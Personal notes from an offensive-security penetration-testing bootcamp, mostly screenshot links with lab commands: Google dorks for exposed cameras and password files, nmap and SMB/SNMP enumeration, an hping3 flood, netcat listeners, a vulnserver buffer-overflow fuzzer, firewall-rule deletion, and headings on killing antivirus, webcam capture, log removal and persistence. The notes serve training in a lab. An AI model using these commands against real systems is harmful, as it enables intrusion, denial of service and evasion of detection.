# Offensive Security - Penetrations Testing Bootcamp

## Day 1 – What is penetration testing

**2022 Data Breach**

Investigations Report

https://www.verizon.com/business/en-gb/resources/reports/dbir/

**Public Pentesting Reports**

https://github.com/juliocesarfort/public-pentesting-reports

**Frameworks**

- ISSAF - Information Systems Security Assessment

- OSSTMM - Open Source Security Testing Methodology Manual

- OWASP - Open Web Application Security Project

- MITRE ATT&CK

---

## Day 2 – Creating your own pentesting lab

**Update 'locate' DB**

```
sudo updatedb
```

**Locate file / program**

```
locate -i rockyou
```

**Locate Software**

```
which burpsuite hydra
```

**Find command (Active Search)**

```
find  / rockyou
```

**Find by permission**

```
find / -maxdepth 5 -type f -name "test" -pem 0227
```

**Find modify files last 5 days**

```
find / -maxdepth 5 -type f -atime 5
```

**See Network Connections**

```
netstat
```

**Make all lowercase**

```
cat names.txt | tr '[:upper:]' '[:lower:]'
```

**Add www**

```
cat names.txt | tr '[:upper:]' '[:lower:]' | head -n 20 | dos2unix | awk '$0="www."$0".com"'
```

**Host Information**

```
host srf.ch
```

![](assets/2022-08-23-20-36-17-image.png)

**IP Information of domains**

```
for i in `cat first-names.txt | tr '[:upper:]' '[:lower:]' | head -n 20 | dos2unix | awk '$0="www."$0".com"'`;do host $i | awk '/has address/ { print $4 }';done
```

![](assets/2022-08-23-20-36-42-image.png)

**Python Class**

![](assets/2022-08-23-20-44-49-image.png)

**Pass a command output to a python script:**
https://stackoverflow.com/a/17658680

**IDE de Python  - para desarrolladores profesionales**

https://www.jetbrains.com/es-es/pycharm/

---

## Day 3 – Information Gathering

**Google Hack to find camera**

```
camera linksys inurl:main.cgi
```

**Search for in title**

```
intitle: "TOSHIBA Network Camera - User Login"
```

**Find Vunerability Software**

```
"SquirrelMail version 1.4.1" ext:php
```

```
intitle:"Welcome to Windows Small Business Server 2003"
```

**Find Password**

```
ext:pwd inurl:(service | authors | administrators |users)  "frontpage"
```

**Search for password.txt**

```
intitle: index of /* password.txt
```

[Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon](https://www.exploit-db.com/google-hacking-database)

--- 

**In Kali**

```
host -t ns google.com
```

```
host -t txt google.com
```

```
 nslookup -type=ns google.com
```

```
 nslookup -type=soa google.com
```

```
 nslookup -type=mx google.com
```

```
dig google.com 
```

```
dig google.com A
```

```
 dig google.com any
```

```
 dig -x google.com +short 
```

```
dnsenum
```

**nmap**

```
nmap 10.211.55.7  -p25
```

**Acknowledge Package Send**

```
nmap -sA 10.211.55.7  -p25
```

**Christmas (all Flags)**

```
nmap -sX 10.211.55.7 -p25
```

**No Flags**

```
nmap -sN 10.211.55.7 -p25
```

**UDP Package**

```
nmap -sU 10.211.55.7 -p25
```

---

**hping3 - send (almost) arbitrary TCP/IP packets to network hosts**

man hping3

```
sudo hping3 --traceroute -V -1 10.211.55.7
```

**Check Port 80**

```
sudo hping3 --traceroute -V -1 -p80 10.211.55.7
```

**DDoS Attack**

```
hping3 -1 --flood 10.211.55.7
```

**nmap see top 1000 ports**

```
nmap 10.211.55.7 
```

**smbmap**

```
smbmap -H 10.211.55.7 
```

**rpcclient**

```
rpcclient -U ""  -N 10.211.55.7
```

**smbclient**

```
smbclient -L 10.211.55.7
```

enum4linux

```
enum4linux -h
```

enum4linux all enumeration for default user pw & configs

```
enum4linux -a 10.211.5.10
```

**onesixtyone (snmp scan)**

```
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.211.5.10
```

**snmpwalk**

```
snmpwalk -c public 10.211.5.10 -v 1
```

**snmpset**

```
snmpset 10.211.5.10
```

**dirb**

```
dirb http://10.211.5.10
```

![](assets/2022-08-24-20-28-24-image.png)

**Dirbuster vulns IIS Webserver**

```
dirb http://10.211.5.10 /usr/share/dirb/wordlists/vulns/iis.txt
```

**nikto web vulns scanner**

```
man nikto
```

```
nikto -h 10.211.55.7
```

![](assets/2022-08-24-20-33-16-image.png)

![](assets/2022-08-24-20-34-29-image.png)

**Vuln Scan with nmap**

```
nmap -v --script vuln 10.211.55.7
```

---

**Often you have to adjust vulnerability scripts**

![](assets/2022-08-24-20-50-06-image.png)

![](assets/2022-08-24-20-53-12-image.png)

**Optional Homework**
Install Metasploitable: 1
[Metasploitable: 1 ~ VulnHub](https://www.vulnhub.com/entry/metasploitable-1,28/#top)

**How to install Metasploitable 1 in Virtual Box**

[Installing Metasploitable in VirtualBox - Hackercool Magazine](https://www.hackercoolmagazine.com/installing-metasploitable-in-virtualbox/)

----

## Day 4 – Pentesting tools

![](assets/2022-08-25-19-10-39-image.png)

```
nc 10.211.55.8 22
```

![](assets/2022-08-25-19-13-54-image.png)

**Find Exploit for this OpenSSH Version**

![](assets/2022-08-25-19-14-54-image.png)

![](file://C:\Users\nerdmaster\Documents\WorkingCopies\swiss-cyber-defence\Courses\Offensive Security - Penetrations Testing Bootcamp\assets\2022-08-25-19-19-15-image.png?msec=1661429955299)

**Import own portscanner class:**

![](assets/2022-08-25-19-18-38-image.png)

**Own "small" vuln database:**

![](assets/2022-08-25-19-21-11-image.png)

**Run Script:**

![](assets/2022-08-25-19-22-22-image.png)

**pyExploitDb Library**

![](assets/2022-08-25-19-23-23-image.png)

[pyExploitDb · PyPI](https://pypi.org/project/pyExploitDb/)

**Downloaded exploits in kali**

```
ls /usr/share/exploitdb 
```

**Show Banners from Ports**

```
nmap -sV 10.211.55.8
```

![](assets/2022-08-25-19-29-25-image.png)

```
nmap -h | grep PS
```

[Timing Templates (-T) | Nmap Network Scanning](https://nmap.org/book/performance-timing-templates.html)

**Default Scan Timing**

```
nmap -T3 10.211.55.8
```

**Very Slow Scan**

```
nmap -T1 10.211.55.8
```

**Very Fast Scan**

```
nmap -T5 10.211.55.8
```

**nmap vuln scripts**

```
ls /usr/share/nmap/scripts | grep ssh
```

![](assets/2022-08-25-19-35-31-image.png)

**Automated Scan for smb**

![](assets/2022-08-25-19-36-49-image.png)

**Use all scripts**

```
nmap --script all 10.211.55.8
```

**Netcat (Swiss Army Knife for Network Connection)**

```
nc 10.211.55.8 80
```

![](assets/2022-08-25-19-43-50-image.png)

Write 

```
HTTP GET
```

and enter

**Run netcat as server**

```
nc -nlvp 4444
```

**Exfiltrate Data**

![](assets/2022-08-25-19-46-13-image.png)

**Received**![](assets/2022-08-25-19-45-48-image.png)

**How it looks in Wireshark**

![](assets/2022-08-25-19-47-06-image.png)

**Exfiltrate File**

![](assets/2022-08-25-19-48-54-image.png)

> If someone connect to this Server, he will get content from port.py

![](assets/2022-08-25-19-50-53-image.png)

**Give full controll on this Windows Machine**

![](assets/2022-08-25-19-52-52-image.png)

**On Kali you own now this Windows Machine**

![](assets/2022-08-25-19-53-02-image.png)

**Run Wireshark independet in terminal with &**

```
wireshark&
```

**Unencrypted netcat session (SIM / Next Generation Firewall will detect you)**

```
ncat -nvlp 4444
```

**netcat via SSL encryption**

```
ncat -nvlp 4444 --ssl
```

![](assets/2022-08-25-20-02-24-image.png)

**Reverse Shell Generator**

https://www.revshells.com/

**Reverse Shell on von Linux Machine**

![](assets/2022-08-25-20-10-08-image.png)

**Windows now has access to this Linux Machine**

![](assets/2022-08-25-20-09-46-image.png)

**Snort 3**

> Install snort 3 via Docker on your Kali (Currently best way)

https://hub.docker.com/r/ciscotalos/snort3

> Snort can combine with Wireshark. Also can Scan .pcap files

**Snort Basic Cheatsheet**

https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/116/original/Snort_rule_infographic.pdf

**Install Snort 2**

https://bin3xish477.medium.com/installing-snort-on-kali-linux-9c96f3ab2910

**Snort Config Path**

```
/etc/snort/snort.conf
```

**Snort Custom Rules**

![](assets/2022-08-25-20-27-20-image.png)

**Snort Alert Logs**

```
sudo cat /etc/snort/log/snort
```

![](assets/2022-08-25-20-30-11-image.png)

**See active Network Connections**

```
netstat -antp
```

![](assets/2022-08-25-20-31-20-image.png)

**Rules & Log Output**

![](assets/2022-08-25-20-36-18-image.png)

**Send data via netcat on port 4444**

```
printf "test" | nc <IP> 4444
```

**Dump Network Traffic via Command Line**

```
sudo tcpdump -x -X -i eth0 `port 4444` 
```

**Or via Wireshark command line version**

```
sudo tshark -V -i eth0
```

**Decrypt SSL Keys**

```
touch /home/kali/Desktop/ssltlskeys.log
export SSLKEYLOGFILE=/home/kali/Desktop/ssltlskeys.log
echo $SSLKEYLOGFILE
google-chrome&
sudo wireshark&
```

![](assets/2022-08-25-20-54-36-image.png)

**In Wireshark**

![](assets/2022-08-25-20-54-48-image.png)

![](assets/2022-08-25-20-55-10-image.png)

![](assets/2022-08-25-20-55-18-image.png)

**Now Traffic is unencrypted**

![](assets/2022-08-25-20-55-42-image.png)

**Analyse pcap in snort**

![](assets/2022-08-25-20-57-54-image.png)

![](assets/2022-08-25-20-58-13-image.png)

---

## Day 5 – Creating your own exploits

> Question regarding Google hacks. Does anyone know a Google hack to get all websites with a specific word in the domain name (not url)? For example, I want all websites with the word "saturn", but only websites where "saturn" is in the domain name, e.g., www. saturn.com, www.saturncoffee.com. What I don't want is www.astronomy.com/planets/ringed-planets/saturn.html

```
https://github.com/elceef/dnstwist
```

```
nmap -sV 10.211.55.7
```

![](assets/2022-08-26-19-10-21-image.png)

- https://www.cvedetails.com/

- https://www.exploit-db.com/

![](assets/2022-08-26-19-14-09-image.png)

![](assets/2022-08-26-19-16-25-image.png)

![](assets/2022-08-26-19-17-08-image.png)

![](assets/2022-08-26-19-22-44-image.png)

![](assets/2022-08-26-19-23-43-image.png)

```
netstat -ano | find 4444
```

![](assets/2022-08-26-19-24-21-image.png)

```
nc 10.211.55.7 4444
```

![](assets/2022-08-26-19-24-55-image.png)

![](assets/2022-08-26-19-28-33-image.png)

**Download & rename exploit via wget**

```
wget https://www.exploit-db.com/download/42315 -O eternal2016.py
```

![](assets/2022-08-26-19-41-54-image.png)

**Find Payload**

![](assets/2022-08-26-19-42-38-image.png)

**Our new Payload: <mark>Create new user</mark>**

![](assets/2022-08-26-19-45-57-image.png)

![](assets/2022-08-26-19-51-27-image.png)

**<mark>Bottom two screenshots can be ignored (Exploit didn't work in end)</mark>**

![](assets/2022-08-26-19-55-22-image.png)

![](assets/2022-08-26-19-57-37-image.png)

**Metasploit**

**Interview with Metasploit Founder:**
https://darknetdiaries.com/episode/114/

```
mfsconsole
```

![](assets/2022-08-26-20-22-07-image.png)

![](assets/2022-08-26-20-24-16-image.png)

![](assets/2022-08-26-20-24-45-image.png)

**GUI for Metasploit**

```
sudo apt-get install artimage
```

```
sudo armitage
```

![](assets/2022-08-26-20-29-25-image.png)

![](assets/2022-08-26-20-29-35-image.png)

![](assets/2022-08-26-20-30-00-image.png)

![](assets/2022-08-26-20-30-41-image.png)

Check out what what intressting tools Alejandro has ;-) 

![](assets/2022-08-26-20-34-54-image.png)

**Create own Payload**

![](assets/2022-08-26-20-40-40-image.png)

![](assets/2022-08-26-20-41-13-image.png)

**Vulnhub:  Mr-Robot: 1**

https://www.vulnhub.com/entry/mr-robot-1,151/

**Find Bufferoverflow**

![](assets/2022-08-26-20-49-59-image.png)

**Course Recommendation: The External Pentest Playbook**

https://academy.tcm-sec.com/p/external-pentest-playbook

---

## Day 6 – Metasploit Framework

**Start Metasploit**

```
msfconsole
```

**See what kind of "scan options we have**

```
search scan
```

![](assets/2022-08-27-19-09-51-image.png)

![](assets/2022-08-27-19-15-30-image.png)

![](assets/2022-08-27-19-15-47-image.png)

**Example Metasploit Script**

![](assets/2022-08-27-19-17-00-image.png)

```
search portscan
```

![](assets/2022-08-27-19-18-39-image.png)

![](assets/2022-08-27-19-19-06-image.png)

![](assets/2022-08-27-19-19-52-image.png)

![](assets/2022-08-27-19-20-41-image.png)

```
show options
```

![](assets/2022-08-27-19-21-21-image.png)

![](assets/2022-08-27-19-22-21-image.png)

![](assets/2022-08-27-19-23-30-image.png)

![](assets/2022-08-27-19-24-55-image.png)

![](assets/2022-08-27-19-26-29-image.png)

![](assets/2022-08-27-19-28-39-image.png)

![](assets/2022-08-27-19-32-04-image.png)

```
sudo service postgresql start
```

![](assets/2022-08-27-19-36-42-image.png)

![](assets/2022-08-27-19-37-45-image.png)

![](assets/2022-08-27-19-38-49-image.png)

![](assets/2022-08-27-19-39-26-image.png)

![](assets/2022-08-27-19-40-06-image.png)

```
services
```

![](assets/2022-08-27-19-40-45-image.png)

![](assets/2022-08-27-19-41-59-image.png)

![](assets/2022-08-27-19-42-56-image.png)

![](assets/2022-08-27-19-44-14-image.png)

![](assets/2022-08-27-19-46-15-image.png)

![](assets/2022-08-27-19-47-09-image.png)

![](assets/2022-08-27-19-48-01-image.png)

![](assets/2022-08-27-19-49-42-image.png)

![](assets/2022-08-27-19-51-06-image.png)

![](assets/2022-08-27-19-51-17-image.png)

```
ps
```

![](assets/2022-08-27-19-51-45-image.png)

![](assets/2022-08-27-19-52-01-image.png)

![](assets/2022-08-27-19-52-19-image.png)

![](assets/2022-08-27-19-53-36-image.png)

![](assets/2022-08-27-19-55-05-image.png)

![](assets/2022-08-27-19-57-21-image.png)

![](assets/2022-08-27-19-57-32-image.png)

![](assets/2022-08-27-20-00-10-image.png)

![](assets/2022-08-27-20-12-15-image.png)

![](assets/2022-08-27-20-13-41-image.png)

![](assets/2022-08-27-20-14-30-image.png)

![](assets/2022-08-27-20-14-48-image.png)

![](assets/2022-08-27-20-15-40-image.png)

![](assets/2022-08-27-20-17-13-image.png)

![](assets/2022-08-27-20-18-38-image.png)

![](assets/2022-08-27-20-20-58-image.png)

**Kill Antivirus**

![](assets/2022-08-27-20-22-33-image.png)

https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

```
meterpreter > webcam_list
meterpreter > webcam_snap or use
meterpreter > webcam_snap -I 2
```

![](assets/2022-08-27-20-32-32-image.png)

![](assets/2022-08-27-20-32-52-image.png)

![](assets/2022-08-27-20-37-55-image.png)

![](assets/2022-08-27-20-41-30-image.png)

![](assets/2022-08-27-20-43-37-image.png)

![](assets/2022-08-27-20-44-05-image.png)

![](assets/2022-08-27-20-46-51-image.png)

![](assets/2022-08-27-20-48-20-image.png)

---

## Day 7  – Web application pentesting

![](assets/2022-08-29-19-05-37-image.png)

![](assets/2022-08-29-19-05-54-image.png)

```
https://owasp.org/www-project-top-ten/
```

```
https://nodejs.org
```

**Install Version 18.8.0**

![](assets/2022-08-29-19-08-56-image.png)

```
https://github.com/juice-shop/juice-shop#from-sources
```

![](assets/2022-08-29-19-20-20-image.png)

![](assets/2022-08-29-19-21-12-image.png)

![](assets/2022-08-29-19-27-04-image.png)

![](assets/2022-08-29-19-32-48-image.png)

![](assets/2022-08-29-19-36-26-image.png)

![](assets/2022-08-29-19-37-00-image.png)

![](assets/2022-08-29-19-37-49-image.png)

![](assets/2022-08-29-19-40-46-image.png)

![](assets/2022-08-29-19-45-39-image.png)

![](assets/2022-08-29-19-46-12-image.png)

![](assets/2022-08-29-19-46-43-image.png)

![](assets/2022-08-29-19-48-22-image.png)

![](assets/2022-08-29-19-56-41-image.png)

Good Framework for Attacker

https://beefproject.com/

**Put in Search Field**

![](assets/2022-08-29-20-07-43-image.png)

![](assets/2022-08-29-20-16-44-image.png)

![](assets/2022-08-29-20-16-56-image.png)

![](assets/2022-08-29-20-17-10-image.png)

![](assets/2022-08-29-20-17-21-image.png)

![](assets/2022-08-29-20-18-03-image.png)

![](assets/2022-08-29-20-19-27-image.png)

![](assets/2022-08-29-20-21-42-image.png)

![](assets/2022-08-29-20-22-16-image.png)

![](assets/2022-08-29-20-23-11-image.png)

![](assets/2022-08-29-20-26-41-image.png)

![](assets/2022-08-29-20-27-53-image.png)

![](assets/2022-08-29-20-31-41-image.png)

![](assets/2022-08-29-20-29-30-image.png)

![](assets/2022-08-29-20-45-04-image.png)

![](assets/2022-08-29-20-36-45-image.png)

![](assets/2022-08-29-20-43-03-image.png)

[GitHub - prometheus/prometheus: The Prometheus monitoring system and time series database.](https://github.com/prometheus/prometheus)

![](assets/2022-08-29-20-46-45-image.png)

![](assets/2022-08-29-20-50-50-image.png)

---

## Day 8 – Web application pentesting

![](assets/2022-08-30-19-40-00-image.png)

> From HERBAIN BOGNON to Everyone: Launch the web server with <mark>npm start </mark>in the webapp folder then open a web browser to localhost:3000

![](assets/2022-08-30-19-11-19-image.png)

![](assets/2022-08-30-19-13-07-image.png)

![](assets/2022-08-30-19-14-40-image.png)

```
SELECT * FROM user WHERE user = ‘%s' AND password = ‘%s‘
```

![](assets/2022-08-30-19-21-27-image.png)

![](assets/2022-08-30-19-21-45-image.png)

![](assets/2022-08-30-19-25-38-image.png)

![](assets/2022-08-30-19-27-47-image.png)

![](assets/2022-08-30-19-27-56-image.png)

![](assets/2022-08-30-19-28-21-image.png)

```
locate big.txt
```

![](assets/2022-08-30-19-30-31-image.png)

![](assets/2022-08-30-19-34-04-image.png)

![](assets/2022-08-30-19-35-03-image.png)

![](assets/2022-08-30-19-35-25-image.png)

![](assets/2022-08-30-19-38-18-image.png)

![](assets/2022-08-30-19-40-16-image.png)

![](assets/2022-08-30-19-42-50-image.png)

```
locate webshell
```

![](assets/2022-08-30-19-45-35-image.png)

![](assets/2022-08-30-19-48-25-image.png)

![](assets/2022-08-30-19-51-31-image.png)

![](assets/2022-08-30-19-52-09-image.png)

![](assets/2022-08-30-19-52-40-image.png)

![](assets/2022-08-30-19-52-49-image.png)

![](assets/2022-08-30-20-04-29-image.png)

![](assets/2022-08-30-20-05-17-image.png)

![](assets/2022-08-30-20-05-59-image.png)

![](assets/2022-08-30-20-06-10-image.png)

![](assets/2022-08-30-20-07-27-image.png)

![](assets/2022-08-30-20-23-31-image.png)

![](assets/2022-08-30-20-24-25-image.png)

![](assets/2022-08-30-20-26-06-image.png)

![](assets/2022-08-30-20-28-10-image.png)

![](assets/2022-08-30-20-30-46-image.png)

![](assets/2022-08-30-20-33-11-image.png)

![](assets/2022-08-30-20-38-12-image.png)

![](assets/2022-08-30-20-44-07-image.png)

![](assets/2022-08-30-20-45-58-image.png)

![](assets/2022-08-30-20-47-15-image.png)

![](assets/2022-08-30-20-52-26-image.png)

![](assets/2022-08-30-20-59-30-image.png)

![](assets/2022-08-30-21-01-17-image.png)

---

## Day 9 – Buffer Overflow

```
Check the security.txt if there's information about the bug bounty (same as robots.txt)
```

![](assets/2022-08-31-19-11-34-image.png)

![](assets/2022-08-31-19-12-42-image.png)

![](assets/2022-08-31-19-14-12-image.png)

![](assets/2022-08-31-19-19-42-image.png)

![](assets/2022-08-31-19-23-13-image.png)

![](assets/2022-08-31-19-23-44-image.png)

![](assets/2022-08-31-19-23-55-image.png)

Steps:

1. Crosssite Scripting

2. Session Hijacking

![](assets/2022-08-31-19-26-01-image.png)

> **What is BeEF?**
> 
> BeEF is short for The Browser Exploitation Framework. It is a
>  penetration testing tool that focuses on the web browser.

https://beefproject.com/

![](assets/2022-08-31-19-32-05-image.png)

![](assets/2022-08-31-19-33-37-image.png)

![](assets/2022-08-31-19-35-54-image.png)

![](assets/2022-08-31-19-36-02-image.png)

![](assets/2022-08-31-19-38-30-image.png)

![](assets/2022-08-31-19-38-42-image.png)

![](assets/2022-08-31-19-40-54-image.png)

![](assets/2022-08-31-19-41-40-image.png)

![](assets/2022-08-31-19-43-37-image.png)

![](assets/2022-08-31-19-44-49-image.png)

![](assets/2022-08-31-19-45-57-image.png)

![](assets/2022-08-31-19-46-07-image.png)

![](assets/2022-08-31-19-47-06-image.png)

![](assets/2022-08-31-19-47-31-image.png)

![](assets/2022-08-31-19-50-27-image.png)

![](assets/2022-08-31-19-51-11-image.png)

![](assets/2022-08-31-19-52-56-image.png)

![](assets/2022-08-31-19-53-43-image.png)

**sqlmap OS shell upload**

![](assets/2022-08-31-19-55-27-image.png)

![](assets/2022-08-31-19-54-34-image.png)

![](assets/2022-08-31-19-55-38-image.png)

**VM he used**

```
https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/
```

**Buffer Overflow**

![](assets/2022-08-31-20-11-54-image.png)

```
https://github.com/stephenbradshaw/vulnserver
```

![](assets/2022-08-31-20-14-26-image.png)

```
https://immunityinc.com/products/debugger/
```

![](assets/2022-08-31-20-14-42-image.png)

![](assets/2022-08-31-20-17-38-image.png)

![](assets/2022-08-31-20-18-29-image.png)

![](assets/2022-08-31-20-18-44-image.png)

Code:

```
#!/usr/bin/python

import socket
import os
import sys
import time

host="10.211.55.7"
port=4444

buffer=["A"]
counter=100
while len(buffer) <= 30:
                buffer.append("A"*counter)
                counter=counter+200

for string in buffer:
        print "fuzzing TRUN with %s bytes" % len(string)
        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        expl.connect((host, port))
        expl.send("TRUN /.:/" + string)
        expl.close()
    time.sleep(1)
```

![](assets/2022-08-31-20-20-12-image.png)

![](assets/2022-08-31-20-20-38-image.png)

**Menu -> File -> Attach**

![](assets/2022-08-31-20-21-28-image.png)

![](assets/2022-08-31-20-21-57-image.png)

**Click "Play" Button**

![](assets/2022-08-31-20-22-19-image.png)

![](assets/2022-08-31-20-25-14-image.png)

![](assets/2022-08-31-20-27-20-image.png)

![](assets/2022-08-31-20-27-36-image.png)

**Lead to DDoS**

![](assets/2022-08-31-20-29-25-image.png)

[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

![](assets/2022-08-31-20-32-30-image.png)

```
#!/usr/bin/python

import socket
import os
import sys

host="10.211.55.7"
port=4444

buffer = "TRUN /.:/" + "A" * 5900

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()
```

![](assets/2022-08-31-20-34-39-image.png)

![](assets/2022-08-31-20-35-06-image.png)

![](assets/2022-08-31-20-35-24-image.png)

![](assets/2022-08-31-20-35-35-image.png)

![](assets/2022-08-31-20-36-38-image.png)

![](assets/2022-08-31-20-36-47-image.png)

![](assets/2022-08-31-20-37-03-image.png)

![](assets/2022-08-31-20-37-21-image.png)

```
https://shell-storm.org/shellcode/
```

![](assets/2022-08-31-20-40-22-image.png)

**Restart Server**

![](assets/2022-08-31-20-41-38-image.png)

**Restart Immunity Debugger**

![](assets/2022-08-31-20-42-07-image.png)

![](assets/2022-08-31-20-46-01-image.png)

![](assets/2022-08-31-20-46-59-image.png)

![](assets/2022-08-31-20-50-27-image.png)

![](assets/2022-08-31-20-50-39-image.png)

![](assets/2022-08-31-20-50-51-image.png)

**Avoid ASLR (Memory Protection)**

![](assets/2022-08-31-20-52-01-image.png)

> From Chat:
> 
> from quick search in Google: What is ASLR in operating system?
> ASLR MEANING Address Space Layout Randomization (ASLR) is a computer security technique which involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space.

- LiveOverflow on youtube

- Plus the Tryhackme Buffer Overflow Prep room

- Also consider learning pwntools

---

## Day 10 – Privilege Escalation

![](assets/2022-09-01-19-17-07-image.png)

![](assets/2022-09-01-19-13-23-image.png)

![](assets/2022-09-01-19-13-34-image.png)

![](assets/2022-09-01-19-13-54-image.png)

![](assets/2022-09-01-19-14-28-image.png)

![](assets/2022-09-01-19-15-15-image.png)

search for `jump esp`

![](assets/2022-09-01-19-20-22-image.png)

![](assets/2022-09-01-19-22-56-image.png)

![](assets/2022-09-01-19-26-12-image.png)

![](assets/2022-09-01-19-26-37-image.png)

> From Chat
> 
> If you're Looking for strings in a program, you could also use something like Ghidra or IDA

![](assets/2022-09-01-19-27-51-image.png)

![](assets/2022-09-01-19-29-14-image.png)

> From Chat:
> Also one on the history of Ghidra (used to be a tool developped by IntelligenceAgencies and then became open source:
> 
> https://www.youtube.com/watch?v=kx2xp7IQNSc

![](assets/2022-09-01-19-33-34-image.png)

![](assets/2022-09-01-19-36-45-image.png)

![](assets/2022-09-01-19-37-10-image.png)

![](assets/2022-09-01-19-39-18-image.png)

`351` is payload size

![](assets/2022-09-01-19-40-11-image.png)

\x90 (is a space) multiply by 16

![](assets/2022-09-01-19-42-00-image.png)

![](assets/2022-09-01-19-42-13-image.png)

**Programm not anymore crasht**

![](assets/2022-09-01-19-43-11-image.png)

**Reverse shell worked**

![](assets/2022-09-01-19-43-25-image.png)

**Remote Desktop**

![](assets/2022-09-01-19-52-13-image.png)

![](assets/2022-09-01-19-55-35-image.png)

![](assets/2022-09-01-19-55-42-image.png)

```
https://github.com/stephenbradshaw/vulnserver
```

> From Chat
> 
> Here's an example from a CSS course Assignment, where I did some powershel deobfuscation from a payload extracted from a memory dump:
> 
> https://import.cdn.thinkific.com/380432/nmxRVUvRmW4ICetXD2ww_Assignment-20--20Volatility-2001-20--20Robert-20Seyer.pdf

![](assets/2022-09-01-20-14-58-image.png)

```
show payloads
```

![](assets/2022-09-01-20-15-19-image.png)

```
show info
```

```
show options
```

![](assets/2022-09-01-20-16-44-image.png)

![](assets/2022-09-01-20-17-17-image.png)

![](assets/2022-09-01-20-18-25-image.png)

![](assets/2022-09-01-20-18-56-image.png)

![](assets/2022-09-01-20-19-21-image.png)

![](assets/2022-09-01-20-19-47-image.png)

![](assets/2022-09-01-20-20-15-image.png)

![](assets/2022-09-01-20-20-51-image.png)

![](assets/2022-09-01-20-21-25-image.png)

![](assets/2022-09-01-20-22-05-image.png)

![](assets/2022-09-01-20-23-00-image.png)

![](assets/2022-09-01-20-23-27-image.png)

![](assets/2022-09-01-20-23-45-image.png)

![](assets/2022-09-01-20-23-52-image.png)

![](assets/2022-09-01-20-24-03-image.png)

![](assets/2022-09-01-20-24-56-image.png)

![](assets/2022-09-01-20-28-06-image.png)

![](assets/2022-09-01-20-30-14-image.png)

**Remove Logs**

![](assets/2022-09-01-20-49-13-image.png)

![](assets/2022-09-01-20-49-39-image.png)

![](assets/2022-09-01-20-32-32-image.png)

![](assets/2022-09-01-20-35-40-image.png)

![](assets/2022-09-01-20-35-08-image.png)

![](assets/2022-09-01-20-36-14-image.png)

![](assets/2022-09-01-20-36-28-image.png)

![](assets/2022-09-01-20-36-53-image.png)

![](assets/2022-09-01-20-37-06-image.png)

**Delete SingelCommand in History**

![](assets/2022-09-01-20-38-29-image.png)

![](assets/2022-09-01-20-39-39-image.png)

![](assets/2022-09-01-20-41-59-image.png)

![](assets/2022-09-01-20-42-13-image.png)

![](assets/2022-09-01-20-43-52-image.png)

![](assets/2022-09-01-20-45-18-image.png)

![](assets/2022-09-01-20-45-38-image.png)

![](assets/2022-09-01-20-46-37-image.png)

![](assets/2022-09-01-20-47-21-image.png)

![](assets/2022-09-01-20-49-23-image.png)

![](assets/2022-09-01-20-50-00-image.png)

![](assets/2022-09-01-20-50-19-image.png)

![](assets/2022-09-01-20-50-39-image.png)

![](assets/2022-09-01-20-50-46-image.png)

![](assets/2022-09-01-20-51-58-image.png)

![](assets/2022-09-01-20-59-53-image.png)

![](assets/2022-09-01-21-00-20-image.png)

![](assets/2022-09-01-21-00-30-image.png)

```
netsh advfirewall firewall delete rule name=all protocol=tcp localport=80
```

![](assets/2022-09-01-21-00-44-image.png)

> Scheduled Tasks are a popular way to get persistence on a machine.

![](assets/2022-09-01-21-01-05-image.png)

Replace Task with your own Reverse Shell .exe

![](assets/2022-09-01-21-02-28-image.png)

![](assets/2022-09-01-21-02-43-image.png)

---

## Day 11 -  Friday: Linux privilege escalation and lateral movement

![](assets/2022-09-02-19-13-19-image.png)

![](assets/2022-09-02-19-14-17-image.png)

![](assets/2022-09-02-19-14-50-image.png)

![](assets/2022-09-02-19-16-47-image.png)

![](assets/2022-09-02-19-16-58-image.png)

![](assets/2022-09-02-19-18-07-image.png)

![](assets/2022-09-02-19-18-22-image.png)

![](assets/2022-09-02-19-23-48-image.png)

![](assets/2022-09-02-19-24-33-image.png)

![](assets/2022-09-02-19-25-50-image.png)

![](assets/2022-09-02-19-29-10-image.png)

```
https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
```

![](assets/2022-09-02-19-33-52-image.png)

![](assets/2022-09-02-19-34-04-image.png)

![](assets/2022-09-02-19-35-45-image.png)

![](assets/2022-09-02-19-37-08-image.png)

**Or directly over Internet:**

```
https://live.sysinternals.com/
```

![](assets/2022-09-02-19-43-44-image.png)

![](assets/2022-09-02-19-40-49-image.png)

![](assets/2022-09-02-19-56-20-image.png)

![](assets/2022-09-02-19-45-00-image.png)

```
https://github.com/absolomb/WindowsEnum
```

![](assets/2022-09-02-19-51-50-image.png)

```
PS C:\Users\Admin> curl -OutFile pslist.exe https://live.sysinternals.com/

PS C:\Users\Admin> ls .\pslist.exe


    Directory: C:\Users\Admin


Mode                LastWriteTime         Length Name                                                                                                                    
----                -------------         ------ ----                                                                                                                    
-a----       02/09/2022     14:50          17399 pslist.exe
```

![](assets/2022-09-02-19-56-31-image.png)

![](assets/2022-09-02-19-58-17-image.png)

![](assets/2022-09-02-20-04-36-image.png)

![](assets/2022-09-02-20-06-07-image.png)

![](assets/2022-09-02-20-09-15-image.png)

![](assets/2022-09-02-20-14-00-image.png)

![](assets/2022-09-02-20-14-09-image.png)

![](assets/2022-09-02-20-28-04-image.png)

![](assets/2022-09-02-20-28-32-image.png)

![](assets/2022-09-02-20-28-44-image.png)

![](assets/2022-09-02-20-29-13-image.png)

![](assets/2022-09-02-20-31-13-image.png)

![](assets/2022-09-02-20-31-56-image.png)

![](assets/2022-09-02-20-32-05-image.png)

```
ps root
```

```
ps -ef | less
```

```
top
```

![](assets/2022-09-02-20-34-17-image.png)

![](assets/2022-09-02-20-35-04-image.png)

![](assets/2022-09-02-20-35-18-image.png)

![](assets/2022-09-02-20-36-34-image.png)

![](assets/2022-09-02-20-36-42-image.png)

![](assets/2022-09-02-20-37-33-image.png)

![](assets/2022-09-02-20-37-22-image.png)

![](assets/2022-09-02-20-41-39-image.png)

![](assets/2022-09-02-20-45-16-image.png)

![](assets/2022-09-02-20-45-48-image.png)

![](assets/2022-09-02-20-46-00-image.png)

```
